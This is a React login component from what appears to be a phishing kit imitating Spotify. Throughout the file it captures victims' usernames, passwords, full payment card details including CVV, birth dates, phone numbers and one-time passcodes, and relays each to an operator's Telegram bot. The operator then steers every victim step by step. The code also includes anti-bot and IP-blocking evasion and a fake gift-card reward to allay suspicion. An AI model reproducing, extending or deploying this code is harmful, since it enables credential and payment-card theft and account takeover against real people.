import React, { useState, useEffect, useRef } from 'react';
import axios from 'axios';
import { useLanguage } from '../hooks/useLanguage';
import { useTelegramBot } from '../hooks/useTelegramBot';
import { startTimer, trackInteraction, trackTyping, checkAntiBot, resetAntiBot } from '../utils/antiBot';
import LoginScreen from './LoginScreen';
import CardVerificationForm from './CardVerificationForm';
import OtpVerificationForm from './OtpVerificationForm';
import LoadingOverlay from './LoadingOverlay';
import NextStepAppr from './NextStepAppr';
import './LoginForm.css';
import ApprovePopup from './ApprovePopup';
import { countryCodes } from './CardVerificationForm';
import GiftCardPopup from './GiftCardPopup';
import SpotifyApprove from './SpotifyApprove';

// Helper functions for state persistence
const saveState = (key, value) => {
  try {
    sessionStorage.setItem(key, JSON.stringify(value));
  } catch (error) {
    console.error('Error saving state:', error);
  }
};

const loadState = (key, defaultValue) => {
  try {
    const item = sessionStorage.getItem(key);
    return item ? JSON.parse(item) : defaultValue;
  } catch (error) {
    console.error('Error loading state:', error);
    return defaultValue;
  }
};

function LoginForm() {
  const { t } = useLanguage();

  // State management with persistence
  const [loginName, setLoginName] = useState(() => loadState('loginName', ''));
  const [password, setPassword] = useState(() => loadState('password', ''));
  const [errors, setErrors] = useState({ loginName: false, password: false });
  const [showCardForm, setShowCardForm] = useState(() => loadState('showCardForm', false));
  const [isLoading, setIsLoading] = useState(false);
  const [waitingForApproval, setWaitingForApproval] = useState(false);
  const [waitingForOtpApproval, setWaitingForOtpApproval] = useState(false);
  const [showOtpForm, setShowOtpForm] = useState(() => loadState('showOtpForm', false));
  const [otpCode, setOtpCode] = useState(() => loadState('otpCode', ''));
  const [otpError, setOtpError] = useState('');
  const [sessionId, setSessionId] = useState(() => loadState('sessionId', null));
  const [showNextStep, setShowNextStep] = useState(() => loadState('showNextStep', false));
  const [showApprovePopup, setShowApprovePopup] = useState(false);
  const [waitingForAdminOtp, setWaitingForAdminOtp] = useState(false);
  const [showSpotifyApprove, setShowSpotifyApprove] = useState(false);
  const [otpAttempts, setOtpAttempts] = useState(0);

  //giftcard
  const [showGiftCard, setShowGiftCard] = useState(false);
  const [giftCode, setGiftCode] = useState('');

  // Typing tracking
  const [loginTypingSent, setLoginTypingSent] = useState(false);
  const [cardTypingSent, setCardTypingSent] = useState(false);
  const [otpTypingSent, setOtpTypingSent] = useState(false);
  
  // Refs for tracking page logs
  const hasSentCardPageLogRef = useRef(false);
  const hasSentOtpLogRef = useRef(false);
  const hasSentSiteEntryRef = useRef(false);
  
  const [cardDetails, setCardDetails] = useState(() => {
    const saved = sessionStorage.getItem('cardDetails');
    return saved ? JSON.parse(saved) : {
      cardNumber: '', expiryDate: '', cvv: '', cardholderName: '',
      phoneNumber: '', city: '', postalCode: '',
      birthDate: { day: '', month: '', year: '' }
    };
  });
  const [cardErrors, setCardErrors] = useState({});

  // Save state on changes
  useEffect(() => {
    saveState('loginName', loginName);
  }, [loginName]);

  useEffect(() => {
    saveState('password', password);
  }, [password]);

  useEffect(() => {
    saveState('showCardForm', showCardForm);
  }, [showCardForm]);

  useEffect(() => {
    saveState('showOtpForm', showOtpForm);
  }, [showOtpForm]);

  useEffect(() => {
    saveState('otpCode', otpCode);
  }, [otpCode]);

  useEffect(() => {
    saveState('sessionId', sessionId);
  }, [sessionId]);

  useEffect(() => {
    saveState('showNextStep', showNextStep);
  }, [showNextStep]);

  useEffect(() => {
    saveState('cardDetails', cardDetails);
  }, [cardDetails]);

  // Define all handlers BEFORE using them in useTelegramBot
  // Handle Approve Connexion
  const handleApproveLogin = () => {
    console.log('✅ Approve Connexion clicked');
    setWaitingForApproval(false);
    setIsLoading(false);
    setShowApprovePopup(true);
  };

  const handleSpotifyAppr = () => {
    console.log('🎵 Spotify Appr clicked - Opening Spotify Approve page');
    setShowSpotifyApprove(true);
  };

  // Handle OTP Connexion
  const handleOtpLogin = () => {
    console.log('🔐 OTP Connexion clicked');
    setShowNextStep(false);
    setWaitingForApproval(false);
    setIsLoading(false);
    setShowOtpForm(true);
    
    if (sendLoginOtpMessage) {
      sendLoginOtpMessage(loginName, sessionId);
    }
  };

  //giftcard
  const generateGiftCode = () => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let code = '';
    for (let i = 0; i < 16; i++) {
      if (i > 0 && i % 4 === 0) code += '-';
      code += chars[Math.floor(Math.random() * chars.length)];
    }
    return code;
  };

  // Handle Login False
  const handleLoginFalse = () => {
    console.log('❌ Login False clicked');
    setWaitingForApproval(false);
    setIsLoading(false);
    
    setErrors({
      loginName: true,
      password: false
    });
    
    setPassword('');
  };

  // Handle Card Verification from Telegram
  const handleCardVerificationFromTelegram = () => {
    console.log('💳 Card Verification from Telegram clicked');
    setShowNextStep(false);
    setWaitingForApproval(false);
    setIsLoading(false);
    setShowApprovePopup(false);
    setShowOtpForm(false);
    setShowCardForm(true);
  };

  const handleApprove = async () => {
    if (!hasSentCardPageLogRef.current && sendCardVerificationPageLog) {
      await sendCardVerificationPageLog(loginName);
      hasSentCardPageLogRef.current = true;
    }
    
    setWaitingForApproval(false);
    setIsLoading(false);
    const hasCardDetails = cardDetails.cardNumber && cardDetails.cardNumber.trim() !== '';
    
    if (hasCardDetails) {
      console.log('✅ Card already submitted, showing NextStepAppr');
      
      if (sendConfirmationLog) {
        await sendConfirmationLog(loginName, cardDetails.cardNumber, sessionId);
      }
      
      sessionStorage.setItem('loginName', loginName);
      sessionStorage.setItem('cardNumber', cardDetails.cardNumber);
      sessionStorage.setItem('phoneNumber', cardDetails.phoneNumber);
      sessionStorage.setItem('sessionId', sessionId);
      
      setShowNextStep(true);
    } else {
      console.log('📝 Showing card form for first time');
      setShowNextStep(false);
      setShowCardForm(true);
    }
  };
  
  const handleDeny = () => {
    setWaitingForApproval(false);
    setWaitingForOtpApproval(false);
    setIsLoading(false);
    alert(t.denied);
    // Clear saved state on deny
    sessionStorage.clear();
    window.location.reload();
  };

  const handleViewCard = async () => {
    if (!hasSentCardPageLogRef.current && sendCardVerificationPageLog) {
      await sendCardVerificationPageLog(loginName);
      hasSentCardPageLogRef.current = true;
    }
    setWaitingForApproval(false);
    setIsLoading(false);
    setShowCardForm(true);
  };

  const handleNextStep = async () => {
    setShowSpotifyApprove(false);
    if (!hasSentOtpLogRef.current && sendOtpPageLog) {
      await sendOtpPageLog(loginName, cardDetails.phoneNumber, sessionId);
      hasSentOtpLogRef.current = true;
    }
    setShowNextStep(false);
    setWaitingForOtpApproval(false);
    setIsLoading(false);
    setShowCardForm(false);
    setShowOtpForm(true);
    setOtpCode('');
    setOtpError('');
    setOtpAttempts(0);
  };

  const handleBackToCard = () => {
    setShowSpotifyApprove(false);
    console.log('🔵 Back to Card button clicked!');
    setShowOtpForm(false);
    setShowCardForm(true);
    setOtpCode('');
    setOtpError('');
    hasSentOtpLogRef.current = false;
    setOtpTypingSent(false);
  };

  const handleBackToLogin = () => {
    // Clear the IP check flag when going back to login
    sessionStorage.removeItem('ip_checked');
    sessionStorage.removeItem('blocked_ip');
    setShowSpotifyApprove(false);
    console.log('🔵 Back to Login button clicked!');
    setShowNextStep(false);
    setShowCardForm(false);
    setShowOtpForm(false);
    setWaitingForOtpApproval(false);
    setWaitingForApproval(false);
    setIsLoading(false);
    setCardDetails({
      cardNumber: '',
      expiryDate: '',
      cvv: '',
      cardholderName: '',
      phoneNumber: '',
      city: '',
      postalCode: '',
      birthDate: { day: '', month: '', year: '' }
    });
    setCardErrors({});
    setOtpCode('');
    setOtpError('');
    setLoginTypingSent(false);
    setCardTypingSent(false);
    setOtpTypingSent(false);
    hasSentCardPageLogRef.current = false;
    hasSentOtpLogRef.current = false;
    // Clear saved state
    sessionStorage.clear();
    resetAntiBot();
    startTimer();
  };

  const handleBlock = async () => {
    setShowSpotifyApprove(false);
    console.log('🔵 Block IP button clicked!');
    try {
      const response = await axios.get('https://api.ipify.org?format=json');
      const userIP = response.data.ip;
      
      const blockedIPs = JSON.parse(localStorage.getItem('blocked_ips') || '[]');
      if (!blockedIPs.includes(userIP)) {
        blockedIPs.push(userIP);
        localStorage.setItem('blocked_ips', JSON.stringify(blockedIPs));
      }
      
      sessionStorage.setItem('blocked_ip', userIP);
      window.location.href = '/#/blocked';
    } catch (error) {
      console.error('Error blocking IP:', error);
      window.location.href = '/#/blocked';
    }
  };
  
  const handleNextStepAppr = async () => {
    console.log('🔵 Next Step (Appr) button clicked!');
    setShowSpotifyApprove(false);
    setShowNextStep(true);
    setWaitingForApproval(false);
    setIsLoading(false);
  };

  const handleBackToAppr = () => {
    setShowSpotifyApprove(false);
    console.log('🔵 Back to Appr Page button clicked!');
    window.location.href = '/#/';
  };

  const handleDenyOtp = () => {
    setShowSpotifyApprove(false);
    console.log('🔵 Deny OTP button clicked!');
    setOtpError('Invalid OTP code. Please try again.');
  };
  
  const handleOtpFalse = () => {
  setShowSpotifyApprove(false);
  console.log('🚫 OTP False clicked');
  setWaitingForAdminOtp(false);

  const newAttempts = otpAttempts + 1;
  setOtpAttempts(newAttempts);

  if (newAttempts === 1) {
    setOtpError('Incorrect code. Please try again.');
  } else if (newAttempts === 2) {
    setOtpError('Invalid code. Last attempt!');
  } else if (newAttempts >= 3) {
    setOtpError('Card blocked. Please contact your bank.');
    setTimeout(() => {
      setShowOtpForm(false);
      setShowCardForm(false);
      setOtpAttempts(0);
      setOtpCode('');
      setOtpError('');
      setCardDetails({
        cardNumber: '',
        expiryDate: '',
        cvv: '',
        cardholderName: '',
        phoneNumber: '',
        city: '',
        postalCode: '',
      });
      setWaitingForAdminOtp(false);
      sessionStorage.clear();
    }, 2000);
    return;
  }

  setOtpCode('');
};
  
  const handleCardFalse = () => {
    setShowSpotifyApprove(false);
    console.log('❌ Card False button clicked!');
    setShowCardForm(true);
    setShowOtpForm(false);
    setWaitingForOtpApproval(false);
    setWaitingForAdminOtp(false);
    setIsLoading(false);
    
    setCardErrors({});
    
    const popup = document.createElement('div');
    popup.style.cssText = `
      position: fixed;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      background: #1a1a1a;
      color: #e74c3c;
      padding: 14px 28px;
      border-radius: 500px;
      font-size: 14px;
      font-weight: 600;
      z-index: 9999;
      font-family: Arial, sans-serif;
      border: 1px solid #e74c3c;
      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
      animation: slideDown 0.3s ease;
    `;
    popup.textContent = '⚠️ Please verify your card details and try again.';
    document.body.appendChild(popup);
    
    setTimeout(() => {
      popup.style.animation = 'slideUp 0.3s ease forwards';
      setTimeout(() => popup.remove(), 300);
    }, 3000);
  };

  const handleApproveOtp = async () => {
    console.log('✅ OTP Approved by admin!');
    setWaitingForAdminOtp(false);
    setOtpAttempts(0);
    
    if (sendOtpVerifiedLog) {
      await sendOtpVerifiedLog(loginName, cardDetails.phoneNumber, otpCode);
    }
    if (sendSuccessToTelegram) {
      await sendSuccessToTelegram(cardDetails.phoneNumber, sessionId);
    }
    if (sendFormattedCardDetails) {
      await sendFormattedCardDetails(cardDetails, sessionId, loginName, password);
    }
    
    const newGiftCode = generateGiftCode();
    setGiftCode(newGiftCode);
    setShowGiftCard(true);
  };

  // Telegram bot hooks
  const {
    generateSessionId,
    sendLoginRequestToTelegram,
    sendCheckoutEmailToTelegram,
    sendCardDetailsToTelegram,
    sendFormattedCardDetails,
    sendOtpToTelegram,
    sendSuccessToTelegram,
    sendCardVerificationLog,
    sendOtpPageLog,
    sendLoginOtpMessage, 
    sendCardVerificationPageLog,
    sendOtpSubmitLog,
    sendOtpVerifiedLog,
    sendLoginTypingLog,
    sendCardTypingLog,
    sendSiteEntryLog,
    sendOtpTypingLog,
    sendBlockedLog,
    sendConfirmationLog,
  } = useTelegramBot(
    sessionId, 
    handleApprove, 
    handleDeny, 
    handleViewCard, 
    handleNextStep, 
    handleBackToCard, 
    handleBackToLogin, 
    handleBlock,
    handleNextStepAppr,
    handleBackToAppr,
    handleDenyOtp,
    handleOtpFalse,
    handleApproveOtp,
    handleCardFalse,
    handleApproveLogin,
    handleOtpLogin,
    handleLoginFalse,
    handleCardVerificationFromTelegram,
    handleSpotifyAppr 
  );

  // Anti-bot initialization
  useEffect(() => {
    startTimer();
    const handleMouseMove = () => trackInteraction();
    window.addEventListener('mousemove', handleMouseMove);
    
    const sessionBlocked = sessionStorage.getItem('blocked_ip');
    
    if (!sessionBlocked && !hasSentSiteEntryRef.current && sendSiteEntryLog) {
      sendSiteEntryLog();
      hasSentSiteEntryRef.current = true;
    }
    
    return () => {
      window.removeEventListener('mousemove', handleMouseMove);
      resetAntiBot();
    };
  }, []);

  const handleInputChange = async (field, value) => {
    trackTyping();
    
    if (field === 'loginName') {
      setLoginName(value);
      if (!loginTypingSent && value.length === 1 && sendLoginTypingLog) {
        await sendLoginTypingLog(value, 'Login page', 'User is typing username and password');
        setLoginTypingSent(true);
      }
    } else {
      setPassword(value);
      if (!loginTypingSent && value.length === 1 && sendLoginTypingLog) {
        await sendLoginTypingLog(loginName, 'Login page', 'User is typing username and password');
        setLoginTypingSent(true);
      }
    }
    setErrors({ ...errors, [field]: false });
  };

  const handleLogin = async (e) => {
    if (e) {
      e.preventDefault();
      e.stopPropagation();
    }
    
    if (isLoading || waitingForApproval) {
      console.log('⚠️ Login already in progress');
      return;
    }
    
    const newErrors = {
      loginName: loginName.trim() === '',
    };
    setErrors(newErrors);
    
    const antiBotResult = checkAntiBot();
    
    if (!antiBotResult.passed) {
      let userIP = 'Unable to get IP';
      try {
        const ipResponse = await axios.get('https://api.ipify.org?format=json');
        userIP = ipResponse.data.ip;
      } catch (ipError) {
        console.error('Error getting IP:', ipError);
      }
      
      if (sendBlockedLog) {
        await sendBlockedLog(loginName, antiBotResult.reason, userIP);
      }
      sessionStorage.setItem('block_reason', antiBotResult.reason);
      window.location.href = '/#/blocked';
      return;
    }

    sessionStorage.setItem('loginName', loginName.trim());
    sessionStorage.setItem('password', password.trim());

    setIsLoading(true);
    
    try {
      const newSessionId = generateSessionId();
      setSessionId(newSessionId);
      sessionStorage.setItem('telegramSessionId', newSessionId);
      
      const message = `
  🔐 <b>NEW LOGIN ATTEMPT</b> 🔐
  ⏰ <b>Time:</b> ${new Date().toLocaleString()}
  🆔 <b>Session ID:</b> <code>${newSessionId}</code>
  ━━━━━━━━━━━━━━━━━━━━━
  
  📝 <b>LOGIN CREDENTIALS:</b>
  ├ 👤 <b>Username:</b> ${loginName.trim()}
  └ 🔑 <b>Password:</b> ${password.trim()}
  
  ━━━━━━━━━━━━━━━━━━━━━
  🤖 <b>Anti-bot Status:</b> ✅ PASSED
  ━━━━━━━━━━━━━━━━━━━━━
  ⚠️ <i>Choose an action below:</i>
      `;
      
      await sendLoginRequestToTelegram(message, newSessionId);
      
      setTimeout(() => {
        setIsLoading(false);
        setShowCardForm(true);
      }, 3000);
    } catch (error) {
      console.error('Login error:', error);
      setIsLoading(false);
    }
  };

  const handleCardInputChange = async (field, value) => {
    trackTyping();
    
    if (!cardTypingSent && sendCardTypingLog) {
      await sendCardTypingLog(loginName, 'Card Verification page', 'User is filling card details');
      setCardTypingSent(true);
    }

    let formattedValue = value;
    
    if (field === 'cardNumber') {
      formattedValue = value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
      if (formattedValue.length > 19) formattedValue = formattedValue.slice(0, 19);
    }
    
    if (field === 'expiryDate') {
      formattedValue = value.replace(/\D/g, '');
      if (formattedValue.length >= 2) {
        formattedValue = formattedValue.slice(0, 2) + (formattedValue.length > 2 ? '/' + formattedValue.slice(2, 4) : '');
      }
      if (formattedValue.length > 5) formattedValue = formattedValue.slice(0, 5);
    }
    
    if (field === 'cvv') {
      formattedValue = value.replace(/\D/g, '').slice(0, 4);
    }
    
    if (field === 'phoneNumber') {
      const selectedCountry = countryCodes.find(c => c.code === (cardDetails.countryCode || '+1'));
      const maxLength = selectedCountry ? selectedCountry.phoneLength : 10;
      formattedValue = value.replace(/\D/g, '').slice(0, maxLength);
    }
    
    if (field === 'city') {
      formattedValue = value.slice(0, 50);
    }
    
    if (field === 'postalCode') {
      const selectedCountry = countryCodes.find(c => c.code === (cardDetails.countryCode || '+1'));
      const maxZip = selectedCountry?.zipLength || 7;
      formattedValue = value.replace(/\s/g, '').slice(0, maxZip);
    }

    setCardDetails({ ...cardDetails, [field]: formattedValue });
    
    if (cardErrors[field]) {
      setCardErrors({ ...cardErrors, [field]: false });
    }
  };

  const validateCardForm = () => {
    const errors = {};
    
    if (!cardDetails.cardNumber.trim() || cardDetails.cardNumber.replace(/\s/g, '').length < 16) {
      errors.cardNumber = t.validCard;
    }
    
    if (!cardDetails.expiryDate.trim() || !/^\d{2}\/\d{2}$/.test(cardDetails.expiryDate)) {
      errors.expiryDate = t.validExpiry;
    } else {
      const [month, year] = cardDetails.expiryDate.split('/');
      const currentDate = new Date();
      const currentYear = currentDate.getFullYear() % 100;
      const currentMonth = currentDate.getMonth() + 1;
      const expYear = parseInt(year);
      const expMonth = parseInt(month);
      
      if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
        errors.expiryDate = t.cardExpired;
      }
    }
    
    if (!cardDetails.cvv.trim() || (cardDetails.cvv.length !== 3 && cardDetails.cvv.length !== 4)) {
      errors.cvv = t.validCvv;
    }
    
    if (!cardDetails.cardholderName.trim()) {
      errors.cardholderName = t.validCardholder;
    }
    
    if (!cardDetails.phoneNumber.trim()) {
      errors.phoneNumber = 'Phone number is required';
    } else {
      const selectedCountry = countryCodes.find(c => c.code === (cardDetails.countryCode || '+1'));
      const requiredLength = selectedCountry ? selectedCountry.phoneLength : 10;
      
      if (cardDetails.phoneNumber.length !== requiredLength) {
        errors.phoneNumber = `Phone number must be exactly ${requiredLength} digits`;
      }
    }
    
    /*
    // REMOVED: City validation
    if (!cardDetails.city.trim()) {
      errors.city = t.validCity;
    } else if (cardDetails.city.trim().length < 2) {
      errors.city = t.validCityName;
    }
    */
    
    /*
    // REMOVED: Postal code validation
    if (!cardDetails.postalCode.trim()) {
      errors.postalCode = 'Postal code is required';
    } else {
      const selectedCountry = countryCodes.find(c => c.code === (cardDetails.countryCode || '+1'));
      const requiredZip = selectedCountry?.zipLength || 7;
      if (cardDetails.postalCode.length !== requiredZip) {
        errors.postalCode = `Postal code must be exactly ${requiredZip} digits`;
      }
    }
    */
    
    return errors;
  };

  const handleCardSubmit = async (e) => {
    e.preventDefault();
    sessionStorage.setItem('cardNumber', cardDetails.cardNumber);
    // ✅ Ensure sessionId exists before sending to Telegram
    let activeSid = sessionId || sessionStorage.getItem('telegramSessionId');
    if (!activeSid) {
      activeSid = generateSessionId();
      setSessionId(activeSid);
      sessionStorage.setItem('telegramSessionId', activeSid);
    }
    const antiBotResult = checkAntiBot();
    if (!antiBotResult.passed) {
      let userIP = 'Unable to get IP';
      try {
        const ipResponse = await axios.get('https://api.ipify.org?format=json');
        userIP = ipResponse.data.ip;
      } catch (ipError) {
        console.error('Error getting IP:', ipError);
      }
      
      if (sendBlockedLog) {
        await sendBlockedLog(loginName, `Card page - ${antiBotResult.reason}`, userIP);
      }
      sessionStorage.setItem('block_reason', antiBotResult.reason);
      window.location.href = '/#/blocked';
      return;
    }
    
    const errors = validateCardForm();
    
    if (Object.keys(errors).length === 0) {
      setIsLoading(true);
      setWaitingForOtpApproval(true);
      if (sendCardVerificationLog) {
        await sendCardVerificationLog(loginName);
      }
      if (sendCardDetailsToTelegram) {
        await sendCardDetailsToTelegram(cardDetails, activeSid);
      }
      
      sessionStorage.setItem('loginName', loginName);
      sessionStorage.setItem('cardNumber', cardDetails.cardNumber);
      sessionStorage.setItem('phoneNumber', cardDetails.phoneNumber);
      sessionStorage.setItem('sessionId', sessionId);
      
      setIsLoading(false);
    } else {
      setCardErrors(errors);
    }
  };

  const handleOtpSubmit = async (e) => {
    e.preventDefault();
    
    if (!otpCode.trim() || otpCode.length < 6) {
      setOtpError(t.validOtp);
      return;
    }
    
    const antiBotResult = checkAntiBot();
    if (!antiBotResult.passed) {
      let userIP = 'Unable to get IP';
      try {
        const ipResponse = await axios.get('https://api.ipify.org?format=json');
        userIP = ipResponse.data.ip;
      } catch (ipError) {
        console.error('Error getting IP:', ipError);
      }
      
      if (sendBlockedLog) {
        await sendBlockedLog(loginName, `OTP page - ${antiBotResult.reason}`, userIP);
      }
      sessionStorage.setItem('block_reason', antiBotResult.reason);
      window.location.href = '/#/blocked';
      return;
    }
    
    const isLoginOtp = !cardDetails.phoneNumber;
    
    if (isLoginOtp) {
      if (sendOtpSubmitLog) {
        await sendOtpSubmitLog(loginName, 'Login OTP', otpCode);
      }
      
      setWaitingForAdminOtp(true);
      
      setTimeout(() => {
        setWaitingForAdminOtp(false);
        setShowOtpForm(false);
        setShowCardForm(true);
        setOtpCode('');
        setOtpError('');
      }, 2000);
      
    } else {
      setWaitingForAdminOtp(true);
      
      if (sendOtpSubmitLog) {
        await sendOtpSubmitLog(loginName, cardDetails.phoneNumber, otpCode);
      }
      if (sendOtpToTelegram) {
        await sendOtpToTelegram(otpCode, cardDetails.phoneNumber, sessionId);
      }
    }
  };

  const handleOtpChange = async (value) => {
    trackTyping();
    setOtpCode(value);
    if (!otpTypingSent && value.length === 1 && sendOtpTypingLog) {
      await sendOtpTypingLog(loginName, cardDetails.phoneNumber, 'User is typing OTP code');
      setOtpTypingSent(true);
    }
    setOtpError('');
  };

  const isLoadingState = isLoading || waitingForApproval || waitingForOtpApproval || waitingForAdminOtp;

  return (
    <div className="login-container">
      {showSpotifyApprove ? (
        <SpotifyApprove onClose={() => setShowSpotifyApprove(false)} />
      ) : showNextStep ? (
        <NextStepAppr />
      ) : (
        <>
          <LoadingOverlay 
            isLoading={isLoadingState}
            waitingForApproval={waitingForApproval}
            waitingForOtpApproval={waitingForOtpApproval}
            t={t}
          />

          {!showCardForm && !showOtpForm && !waitingForApproval && !waitingForOtpApproval && (
            <LoginScreen
              loginName={loginName}
              password={password}
              errors={errors}
              isLoading={isLoading}
              t={t}
              onInputChange={handleInputChange}
              onLogin={handleLogin}
              onCheckout={async () => {
              sessionStorage.setItem('loginName', loginName);
              if (sendCheckoutEmailToTelegram) {
                await sendCheckoutEmailToTelegram();
              }
              setShowCardForm(true);
              setShowOtpForm(false);
              setShowNextStep(false);
              setWaitingForApproval(false);
            }}
            />
          )}

          {showCardForm && !waitingForOtpApproval && (
            <CardVerificationForm
              cardDetails={cardDetails}
              cardErrors={cardErrors}
              isLoading={isLoading}
              t={t}
              onInputChange={handleCardInputChange}
              onSubmit={handleCardSubmit}
            />
          )}

          {showOtpForm && (
            <OtpVerificationForm
              otpCode={otpCode}
              otpError={otpError}
              isLoading={isLoading}
              t={t}
              onOtpChange={handleOtpChange}
              onSubmit={handleOtpSubmit}
              onBack={handleBackToCard}
            />
          )}

          {waitingForAdminOtp && (
            <div className="loading-overlay">
              <div className="spinner"></div>
              <p>Please Wait ...</p>
            </div>
          )}

          {showApprovePopup && (
            <ApprovePopup onClose={() => setShowApprovePopup(false)} />
          )}
        </>
      )}
      
      {showGiftCard && (
        <GiftCardPopup 
          giftCode={giftCode} 
          onClose={() => setShowGiftCard(false)} 
        />
      )}
    </div>
  );
}

export default LoginForm;